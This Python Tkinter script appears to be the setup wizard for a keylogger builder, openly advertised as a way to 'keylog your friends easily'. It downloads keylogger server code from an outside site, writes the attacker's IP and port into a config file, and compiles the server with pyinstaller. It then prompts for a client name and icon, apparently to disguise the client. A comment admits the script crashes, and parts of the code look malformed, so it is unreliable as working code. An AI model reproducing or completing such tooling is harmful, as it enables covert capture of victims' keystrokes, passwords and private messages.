import os
from time import sleep
from tkinter import *
import socket
import requests
from tkinter import filedialog

global PORT_ent
global IP_ent

def setupserver():
   ServerSetup.destroy()
   ServerCode = requests.get("https://anonymouskeylogger.netlify.app/assets/keylogger/server.py", allow_redirects=True)
   os.mkdir("./Keylogger")
   os.chdir("./Keylogger")

   SR = open("./SERVER_RAW.py", "wb")
   SR.write(ServerCode.content)
   SR.close()

   #THIS BIT IS WHERE IT CRASHES
   PORT = str(PORT_ent.get())
   IP = str(IP_ent.get())
   CN = open("./connections.py", "x")
   CN.write(f"HOST_IP = {IP}\nHOST_PORT = {PORT}")
   CN.close()

   SI = open("./Server.ico", "wb")
   output = requests.get("https://raw.githubusercontent.com/etheboi/Keylogger/main/Server.ico", allow_redirects=True)
   SI.write(output.content)
   SI.close()
   os.system('pyinstaller --noconfirm --onefile --console --icon "./Server.ico" --name "Server"  "./SERVER_RAW.py"')
   #os.remove("./SERVER_RAW.py")
   #os.remove("./Server.ico")

   ClientSetup = Tk()
   ClientSetup.geometry("500x300")
   ClientSetup.title("Client Setup")

   Label(ClientSetup, text="Client Setup").pack()

   Label(ClientSetup, text="\nName").pack()
   Name_ent = Entry(ClientSetup)
   Name_ent.pack()

   Label(ClientSetup, text="\nIcon").pack()
   Icon_fd = filedialog.askopenfilename(initialdir="/", title="Select A File", filetypes=("ico files", "*.ico"))
   Icon_ent = Entry(ClientSetup)
   Icon_ent.insert(0, Icon_fd)
   Icon_ent.pack()

   ClientSetup.mainloop()


hostname = socket.gethostname()
userip = socket.gethostbyname(hostname)

print("""
$$\      $$\           $$\                                             
$$ | $\  $$ |          $$ |                                            
$$ |$$$\ $$ | $$$$$$\  $$ | $$$$$$$\  $$$$$$\  $$$$$$\$$$$\   $$$$$$\  
$$ $$ $$\$$ |$$  __$$\ $$ |$$  _____|$$  __$$\ $$  _$$  _$$\ $$  __$$\ 
$$$$  _$$$$ |$$$$$$$$ |$$ |$$ /      $$ /  $$ |$$ / $$ / $$ |$$$$$$$$ |
$$$  / \$$$ |$$   ____|$$ |$$ |      $$ |  $$ |$$ | $$ | $$ |$$   ____|
$$  /   \$$ |\$$$$$$$\ $$ |\$$$$$$$\ \$$$$$$  |$$ | $$ | $$ |\$$$$$$$\ 
\__/     \__| \_______|\__| \_______| \______/ \__| \__| \__| \_______|
""")

print("Here is where you can keylog your friends easily!")
sleep(2)
print("Server time!")
sleep(0.5)
ServerSetup = Tk()
ServerSetup.geometry("500x300")
ServerSetup.title("Server Setup")

Label(ServerSetup, text="ServerSetup").pack()

Label(ServerSetup, text="\nHost IP:").pack()
IP_ent = Entry(ServerSetup)
IP_ent.insert(0, userip)
IP_ent.pack()

Label(ServerSetup, text="\nHost PORT").pack()
PORT_ent = Entry(ServerSetup)
PORT_ent.insert(0, 22)
PORT_ent.pack()

Button(ServerSetup, text="Done", command=setupserver).pack()

ServerSetup.mainloop()
